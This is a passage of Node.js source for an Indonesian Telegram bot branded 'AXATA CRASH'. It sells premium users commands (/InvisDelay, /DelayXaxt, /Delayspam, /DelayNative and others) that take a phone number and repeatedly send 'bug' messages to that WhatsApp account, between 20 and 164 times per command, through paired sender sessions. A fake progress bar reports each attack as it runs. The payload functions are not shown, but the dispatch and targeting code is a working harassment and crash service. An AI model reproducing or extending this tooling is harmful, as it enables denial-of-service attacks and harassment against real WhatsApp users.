            reply_markup: {
                inline_keyboard: newButtons
            }
        });
    } catch (err) {
        if (err.response?.body?.description?.includes("message is not modified")) {
            return bot.answerCallbackQuery(callbackQuery.id, {
                text: "Sudah di menu ini.",
                show_alert: false
            });
        } else {
            console.error("Gagal edit media:", err);
        }
    }

    bot.answerCallbackQuery(callbackQuery.id);
});


/// --- ( Parameter ) --- \\\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS DELAY ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/InvisDelay (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 30; i++) {
            await InvisDelay(target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/DelayXaxt (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 25; i++) {
            await DelayXaxt(axata, target);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/Delayspam (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 20; i++) {
            await Delayspam(axata, target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/DelayNative (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 130; i++) {
            await DelayNative(target, true);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/DelayAxt (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 145; i++) {
            await DelayAxt(target);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/DelayInvis (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 145; i++) {
            await DelayInvis(target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/DelayAxata (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 164; i++) {
            await DelayAxata(target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/AxtDelay (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
